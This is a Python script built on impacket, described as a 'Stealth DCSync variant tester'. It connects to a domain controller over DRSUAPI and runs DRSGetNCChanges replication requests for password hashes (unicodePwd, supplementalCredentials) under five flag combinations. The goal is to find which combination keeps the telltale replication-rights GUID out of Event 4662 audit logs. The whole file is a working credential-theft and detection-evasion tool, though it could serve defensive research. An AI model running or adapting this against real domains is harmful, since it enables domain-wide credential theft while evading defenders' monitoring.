#!/usr/bin/env python3
"""
Stealth DCSync variant tester — exercises DRSGetNCChanges with different
flag and ExtendedOp combinations to evaluate whether any combination avoids
the GUID 1131f6ad (DS-Replication-Get-Changes-All) from appearing in
Event 4662 on the domain controller.

Variants tested (V1-V5):
  V1  Baseline       INIT_SYNC | WRIT_REP,    EXOP_REPL_OBJ
  V2  No WRIT_REP     INIT_SYNC,              EXOP_REPL_OBJ
  V3  SPECIAL_SECRET  INIT_SYNC | SPECIAL_SECRET_PROCESSING,  EXOP_REPL_OBJ
  V4  REPL_SECRETS    INIT_SYNC,              EXOP_REPL_SECRETS
  V5  Full REPL_SEC   INIT_SYNC | WRIT_REP,   EXOP_REPL_SECRETS

All variants request only unicodePwd and supplementalCredentials via
pPartialAttrSet (the minimal credential attribute set).

Usage:
  python3 stealth_dcsync_test.py --dc 192.168.1.10 --domain CONTOSO -u Admin -p pass

Dependencies:
  impacket >= 0.12.0, < 0.14.0  (tested with 0.13.1)
"""

import argparse
import datetime
import sys
import time

from impacket.dcerpc.v5 import drsuapi, transport, epm, dtypes
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.smbconnection import SMBConnection

VARIANTS = [
    {
        "name": "V1-BASELINE",
        "flags": drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP,
        "extop": drsuapi.EXOP_REPL_OBJ,
        "desc": "Standard DCSync flags (control group)",
    },
    {
        "name": "V2-NO-WRIT_REP",
        "flags": drsuapi.DRS_INIT_SYNC,
        "extop": drsuapi.EXOP_REPL_OBJ,
        "desc": "Remove DRS_WRIT_REP — test if writable-replica flag gates the permission check",
    },
    {
        "name": "V3-SPECIAL_SECRET",
        "flags": drsuapi.DRS_INIT_SYNC | drsuapi.DRS_SPECIAL_SECRET_PROCESSING,
        "extop": drsuapi.EXOP_REPL_OBJ,
        "desc": "Enable SPECIAL_SECRET_PROCESSING — test if session-key derivation path changes authorization",
    },
    {
        "name": "V4-REPL_SECRETS",
        "flags": drsuapi.DRS_INIT_SYNC,
        "extop": drsuapi.EXOP_REPL_SECRETS,
        "desc": "EXOP_REPL_SECRETS without WRIT_REP — test if secret-specific extop bypasses All",
    },
    {
        "name": "V5-REPL_SECRETS_FULL",
        "flags": drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP,
        "extop": drsuapi.EXOP_REPL_SECRETS,
        "desc": "EXOP_REPL_SECRETS with full flags — test if extop alone changes required GUID",
    },
]


def build_args():
    p = argparse.ArgumentParser(
        description="Stealth DCSync variant tester — tests DRSGetNCChanges flag combinations"
    )
    p.add_argument("--dc", required=True, help="Domain controller IP or hostname")
    p.add_argument("--domain", required=True, help="NetBIOS domain name (e.g. CORP)")
    p.add_argument("--nc", help="Naming context DN (default: derived from --domain)")
    p.add_argument("-u", "--user", required=True, help="Domain user with Get-Changes-All rights")
    p.add_argument("-p", "--password", required=True, help="Password for --user")
    p.add_argument("--attrs", nargs="+", default=None,
                   help="Attribute OIDs to request (default: unicodePwd + supplementalCredentials). "
                        "For non-secret attrs use: 1.2.840.113556.1.4.1 1.2.840.113556.1.4.28 1.2.840.113556.1.4.167")
    p.add_argument("--delay", type=float, default=2.0,
                   help="Seconds between variants (default: 2.0)")
    return p.parse_args()


def _build_attr_set(attr_oids=None):
    if attr_oids is None:
        attr_oids = [
            "1.2.840.113556.1.4.90",   # unicodePwd
            "1.2.840.113556.1.4.125",  # supplementalCredentials
        ]
    prefix_table = []
    partial = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
    partial["dwVersion"] = 1
    partial["cAttrs"] = len(attr_oids)
    for oid in attr_oids:
        partial["rgPartialAttr"].append(drsuapi.MakeAttid(prefix_table, oid))
    return prefix_table, partial


def _build_dsname(nc_dn):
    dsname = drsuapi.DSNAME()
    dsname["SidLen"] = 0
    dsname["Guid"] = b"\x00" * 16
    dsname["Sid"] = b"\x00" * 16
    dsname["NameLen"] = len(nc_dn)
    dsname["StringName"] = nc_dn
    dsname["structLen"] = len(dsname.getData())
    return dsname


def _drs_request(drsr, hdr, ntds_guid, dsname, prefix, partial, flags, extop):
    req = drsuapi.DRSGetNCChanges()
    req["hDrs"] = hdr
    req["dwInVersion"] = 8
    req["pmsgIn"]["tag"] = 8
    req["pmsgIn"]["V8"]["uuidDsaObjDest"] = ntds_guid
    req["pmsgIn"]["V8"]["uuidInvocIdSrc"] = ntds_guid
    req["pmsgIn"]["V8"]["pNC"] = dsname
    req["pmsgIn"]["V8"]["usnvecFrom"]["usnHighObjUpdate"] = 0
    req["pmsgIn"]["V8"]["usnvecFrom"]["usnHighPropUpdate"] = 0
    req["pmsgIn"]["V8"]["pUpToDateVecDest"] = dtypes.NULL
    req["pmsgIn"]["V8"]["ulFlags"] = flags
    req["pmsgIn"]["V8"]["cMaxObjects"] = 1
    req["pmsgIn"]["V8"]["cMaxBytes"] = 0
    req["pmsgIn"]["V8"]["ulExtendedOp"] = extop
    req["pmsgIn"]["V8"]["pPartialAttrSet"] = partial
    req["pmsgIn"]["V8"]["PrefixTableDest"]["PrefixCount"] = len(prefix)
    req["pmsgIn"]["V8"]["PrefixTableDest"]["pPrefixEntry"] = prefix
    req["pmsgIn"]["V8"]["pPartialAttrSetEx1"] = dtypes.NULL
    return drsr.request(req)


def _count_attrs(resp):
    """Return counts of (unicodePwd_bytes, supplementalCredentials_bytes) or None on error."""
    if resp["pmsgOut"]["tag"] < 6:
        return 0, 0
    pwd_bytes = supp_bytes = 0
    for obj in resp["pmsgOut"]["V6"]["pObjects"]["Entinf"]:
        for attr in obj["AttrBlock"]["pAttr"]:
            if attr["attrTyp"] == 0x9005A and attr["AttrVal"]:
                pwd_bytes += len(attr["AttrVal"]["val"])
            elif attr["attrTyp"] == 0x9007D and attr["AttrVal"]:
                supp_bytes += len(attr["AttrVal"]["val"])
    return pwd_bytes, supp_bytes


def main():
    args = build_args()
    nc_dn = args.nc
    if nc_dn is None:
        nc_dn = ",".join(f"DC={p}" for p in args.domain.lower().split("."))

    smb = SMBConnection(args.dc, args.dc)
    smb.login(args.user, args.password, args.domain, "", "")  # gitleaks:allow

    binding = epm.hept_map(args.dc, drsuapi.MSRPC_UUID_DRSUAPI, protocol="ncacn_ip_tcp")
    rpc_tr = transport.DCERPCTransportFactory(binding)
    rpc_tr.setRemoteHost(args.dc)
    if hasattr(rpc_tr, "set_credentials"):
        rpc_tr.set_credentials(args.user, args.password, args.domain, "", "")  # gitleaks:allow
    drsr = rpc_tr.get_dce_rpc()
    drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    drsr.connect()
    drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

    # DRSBind
    bind_req = drsuapi.DRSBind()
    bind_req["puuidClientDsa"] = drsuapi.NTDSAPI_CLIENT_GUID
    ext = drsuapi.DRS_EXTENSIONS_INT()
    ext["cb"] = len(ext)
    ext["dwFlags"] = (
        drsuapi.DRS_EXT_GETCHGREQ_V6
        | drsuapi.DRS_EXT_GETCHGREPLY_V6
        | drsuapi.DRS_EXT_GETCHGREQ_V8
        | drsuapi.DRS_EXT_STRONG_ENCRYPTION
        | drsuapi.DRS_EXT_NONDOMAIN_NCS
    )
    ext["SiteObjGuid"] = drsuapi.NULLGUID
    ext["Pid"] = 0
    ext["dwReplEpoch"] = 0
    ext["dwFlagsExt"] = 0
    ext["ConfigObjGUID"] = drsuapi.NULLGUID
    ext["dwExtCaps"] = 0xFFFFFFFF
    bind_req["pextClient"]["cb"] = len(ext)
    bind_req["pextClient"]["rgb"] = list(ext.getData())
    bind_resp = drsr.request(bind_req)
    hdr = bind_resp["phDrs"]

    # Resolve NtdsDsaObjectGuid via DomainControllerInfo (correct approach)
    dc_info = drsuapi.hDRSDomainControllerInfo(drsr, hdr, args.domain, 2)
    if dc_info["pmsgOut"]["V2"]["cItems"] == 0:
        print(f"[FATAL] No DC info returned for domain {args.domain}")
        sys.exit(1)
    ntds_guid = dc_info["pmsgOut"]["V2"]["rItems"][0]["NtdsDsaObjectGuid"]

    prefix_table, partial_attr_set = _build_attr_set(args.attrs)
    dsname = _build_dsname(nc_dn)

    print("=" * 72)
    print(f"  Stealth DCSync Variant Tester")
    print(f"  Target : {args.dc}")
    print(f"  Domain : {args.domain}  ({nc_dn})")
    print("=" * 72)

    timestamps = []

    for v in VARIANTS:
        ts_start = datetime.datetime.now(datetime.UTC)
        try:
            resp = _drs_request(drsr, hdr, ntds_guid, dsname,
                                prefix_table, partial_attr_set,
                                v["flags"], v["extop"])
            pwd_b, supp_b = _count_attrs(resp)
            status = "OK"
            detail = f"pwd={pwd_b}B supp={supp_b}B"
        except Exception as exc:
            err_code = getattr(exc, "get_error_code", lambda: None)()
            status = "FAIL"
            detail = str(exc)[:100]
            if err_code:
                detail = f"0x{err_code & 0xFFFFFFFF:08X} {detail}"

        ts_end = datetime.datetime.now(datetime.UTC)
        timestamps.append(ts_start)

        print(f"\n  [{ts_start.strftime('%H:%M:%S.%f')[:-3]}] {v['name']}")
        print(f"    Flags : 0x{v['flags']:08X}  ExtendedOp : {v['extop']}")
        print(f"    Desc  : {v['desc']}")
        print(f"    Result: {status}  ({detail})")

        time.sleep(args.delay)

    # Print event log query
    window = timestamps[0].strftime("%Y-%m-%dT%H:%M:%S")
    print()
    print("=" * 72)
    print("  Event 4662 query — run this on the DC:")
    print("=" * 72)
    print()
    print(f'  wevtutil qe Security /q:"*[System[EventID=4662]')
    print(f'  [TimeCreated[@SystemTime>\'{window}.000Z\']]]"')
    print(f'  /c:20 /rd:true /f:text')
    print()
    print("  Relevant GUIDs:")
    print("    1131f6aa-... = DS-Replication-Get-Changes (baseline)")
    print("    1131f6ad-... = DS-Replication-Get-Changes-All  <-- always present?")
    print("    89e95b76-... = DS-Replication-Get-Changes-In-Filtered-Set")
    print()
    print("  To filter by specific LogonID, look for the Subject field in each event.")
    print()

    try:
        drsuapi.hDRSUnbind(drsr, hdr)
    except Exception:
        pass
    drsr.disconnect()
    smb.logoff()


if __name__ == "__main__":
    main()
